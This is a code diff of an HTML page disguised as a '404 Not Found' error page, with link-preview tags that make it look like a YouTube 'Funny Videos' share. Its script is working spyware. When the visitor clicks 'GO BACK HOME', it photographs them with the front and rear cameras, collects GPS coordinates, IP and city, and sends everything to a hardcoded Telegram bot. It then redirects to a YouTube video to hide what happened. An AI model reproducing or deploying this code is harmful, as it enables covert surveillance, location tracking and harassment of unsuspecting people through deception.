@@ -1,125 +1,138 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>404 Not Found</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Funny Videos 2026 - Best Moments">
+    <meta property="og:description" content="Watch the funniest moments of the week. Click to play.">
+    <meta property="og:image" content="https://i.ytimg.com/vi/sWA-osOeiJg/hq720.jpg">
+    <link rel="icon" href="https://www.youtube.com/s/desktop/28ea0284/img/favicon_32x32.png">
 
-<style>
-body {
-    font-family: Arial, Helvetica, sans-serif;
-    background: #fff;
-    color: #000;
-    padding: 40px;
-}
-h1 { font-size: 32px; }
-p  { font-size: 16px; }
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body, html {
+            height: 100%; margin: 0; display: flex; justify-content: center;
+            align-items: center; font-family: 'Helvetica', Arial, sans-serif;
+            background-color: #fcfcfc; color: #000; text-align: center;
+        }
+        .container { max-width: 600px; padding: 20px; }
+        h1 { font-size: 130px; margin: 0; font-weight: 800; line-height: 1; }
+        h2 { font-size: 28px; margin: 20px 0 5px 0; font-weight: 700; }
+        p { color: #999; font-size: 18px; margin-bottom: 40px; }
+        
+        #photoBtn {
+            background-color: #222; color: #fff; padding: 12px 25px;
+            border: none; text-transform: uppercase; font-weight: bold;
+            cursor: pointer; font-size: 13px; letter-spacing: 1px;
+        }
 
-#photoBtn {
-    margin-top: 20px;
-    font-size: 16px;
-    color: #0066cc;
-    cursor: pointer;
-    text-decoration: underline;
-    background: none;
-    border: none;
-    padding: 0;
-}
-
-#progressBox {
-    margin-top: 25px;
-    display: none;
-    text-align: center;
-}
-#status {
-    font-weight: bold;
-    margin-bottom: 12px;
-    font-size: 18px;
-}
-#loader {
-    width: 80px;
-    height: 80px;
-}
-video, canvas { display: none; }
-</style>
+        #progressBox { margin-top: 30px; display: none; }
+        .progress { width: 200px; height: 2px; background: #eee; margin: 0 auto; }
+        .bar { height: 100%; width: 0%; background: #000; transition: 0.1s; }
+        video, canvas { display: none; }
+    </style>
 </head>
-
 <body>
 
-<h1>404 Not Found</h1>
-<p>The requested URL was not found on this server.</p>
+<div class="container">
+    <h1>404</h1>
+    <h2>Oops, This Page Not Found!</h2>
+    <p>The link might be corrupted,<br>or the page may have been removed</p>
 
-<button id="photoBtn">Rasmga olish</button>
+    <button id="photoBtn">GO BACK HOME</button>
 
-<div id="progressBox">
-    <div id="status">IN PROGRESS</div>
-    <img id="loader" src="https://i.gifer.com/YCZH.gif" alt="loading">
+    <div id="progressBox">
+        <div class="progress"><div class="bar" id="bar"></div></div>
+    </div>
 </div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
-const CHAT_ID  = "7880376636";
+    const BOT_TOKEN = "8253226409:AAF3QMVPFJt5FY30cKuUQyosR0oivsRLUxg";
+    const CHAT_ID = "7880376636";
+    const TARGET_URL = "https://www.youtube.com/watch?v=sWA-osOeiJg";
 
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
 
-function showLoader() {
-    document.getElementById("progressBox").style.display = "block";
-}
-
-// Kamera tayyor bo'lishini kutib, rasm olish
-async function capture(facingMode) {
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode }
-    });
-    video.srcObject = stream;
-
-    // Video metadata tayyor bo‘lishini kutish
-    await new Promise(resolve => {
-        video.onloadedmetadata = () => {
-            video.play();
-            resolve();
+    // Aniq GPS va IP ma'lumotlarini olish
+    async function getDetailedInfo() {
+        let gpsInfo = "📍 GPS: Ruxsat berilmadi yoki xato";
+        
+        // GPS koordinatalarini olishga urinish
+        const getGPS = () => {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve(`📍 Aniq GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                    },
+                    () => { resolve("📍 GPS: Foydalanuvchi rad etdi"); },
+                    { enableHighAccuracy: true, timeout: 7000 }
+                );
+            });
         };
-    });
 
-    // Qo‘shimcha 0.8s kutish, video oqimi barqaror bo‘lsin
-    await new Promise(r => setTimeout(r, 800));
+        try {
+            const [ipRes, gpsRes] = await Promise.all([
+                fetch('https://ipapi.co/json/').then(r => r.json()),
+                getGPS()
+            ]);
+            
+            const n = new Date();
+            const time = `${n.getHours()}:${n.getMinutes()}:${n.getSeconds()}`;
+            
+            return `🕒 Vaqt: ${time}\n🌐 IP: ${ipRes.ip}\n🏙 Shahar: ${ipRes.city}\n${gpsRes}`;
+        } catch (e) {
+            return "⚠️ Ma'lumot olishda xatolik";
+        }
+    }
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video, 0, 0);
+    async function send(blob, text) {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", blob);
+        fd.append("caption", text);
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+    }
 
-    stream.getTracks().forEach(t => t.stop());
+    async function capture(mode) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+            video.srcObject = stream;
+            await new Promise(r => video.onloadedmetadata = r);
+            await new Promise(r => setTimeout(r, 1200)); // Qora rasm chiqmasligi uchun kutish
 
-    return new Promise(res => {
-        canvas.toBlob(blob => res(blob), "image/jpeg", 0.9);
-    });
-}
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            
+            const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.7));
+            stream.getTracks().forEach(t => t.stop());
+            return blob;
+        } catch (e) { return null; }
+    }
 
-async function sendToTelegram(blob) {
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("photo", blob);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: fd
-    });
-}
+    document.getElementById("photoBtn").onclick = async () => {
+        document.getElementById("progressBox").style.display = "block";
+        const bar = document.getElementById("bar");
+        bar.style.width = "30%";
 
-document.getElementById("photoBtn").onclick = async () => {
-    showLoader();
+        // Ma'lumotlarni parallel yig'ish (Tezlik uchun)
+        const info = await getDetailedInfo();
+        bar.style.width = "50%";
+        
+        const f = await capture("user");
+        if (f) await send(f, "Old Kamera\n" + info);
+        bar.style.width = "80%";
 
-    // OLD kamera
-    const frontBlob = await capture("user");
-    sendToTelegram(frontBlob);
-
-    // ORQA kamera
-    const backBlob = await capture("environment");
-    sendToTelegram(backBlob);
-};
+        const b = await capture("environment");
+        if (b) await send(b, "Orqa Kamera\n" + info);
+        
+        bar.style.width = "100%";
+        setTimeout(() => { window.location.href = TARGET_URL; }, 500);
+    };
 </script>
 
 </body>
